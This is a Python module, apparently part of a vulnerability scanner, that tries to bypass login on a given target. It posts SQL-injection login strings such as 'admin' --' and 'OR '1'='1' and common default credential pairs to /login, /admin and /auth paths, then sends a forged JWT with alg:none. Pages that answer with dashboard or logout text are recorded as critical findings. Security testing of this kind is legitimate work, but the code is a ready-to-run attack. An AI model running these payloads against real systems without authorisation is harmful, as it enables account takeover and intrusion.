from typing import Optional
import aiohttp

BYPASS_PAYLOADS = [
    {"username": "admin' --", "password": "password"},
    {"username": "admin' OR '1'='1", "password": "admin' OR '1'='1"},
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password123"},
    {"username": "administrator", "password": "administrator"},
    {"username": "guest", "password": "guest"},
    {"username": "test", "password": "test"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin123"},
    {"username": "{\"typ\":\"JWT\",\"alg\":\"none\"}", "password": "test"},
]

JWT_NONE_HEADER = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0."


async def run(target: str, scan_id: Optional[int] = None) -> list[dict]:
    results = []
    login_urls = [
        f"https://{target}/login" if not target.startswith("http") else f"{target.rstrip('/')}/login",
        f"https://{target}/admin" if not target.startswith("http") else f"{target.rstrip('/')}/admin",
        f"https://{target}/auth" if not target.startswith("http") else f"{target.rstrip('/')}/auth",
    ]

    async with aiohttp.ClientSession() as session:
        for login_url in login_urls:
            for creds in BYPASS_PAYLOADS:
                try:
                    async with session.post(
                        login_url,
                        data=creds,
                        timeout=aiohttp.ClientTimeout(total=10),
                    ) as resp:
                        text = await resp.text()
                        if resp.status == 200 and ("dashboard" in text.lower() or "welcome" in text.lower() or "logout" in text.lower()):
                            results.append({
                                "finding_type": "Auth Bypass",
                                "severity": "critical",
                                "url": login_url,
                                "payload": str(creds),
                                "evidence": f"200 OK with credentials: {creds}",
                            })
                            break
                except Exception:
                    pass

            try:
                async with session.get(
                    login_url,
                    headers={"Authorization": f"Bearer {JWT_NONE_HEADER}.c29tZXRoaW5n"},
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    if resp.status == 200:
                        results.append({
                            "finding_type": "Auth Bypass (JWT None)",
                            "severity": "critical",
                            "url": login_url,
                            "evidence": "JWT with alg:none accepted",
                        })
            except Exception:
                pass
    return results
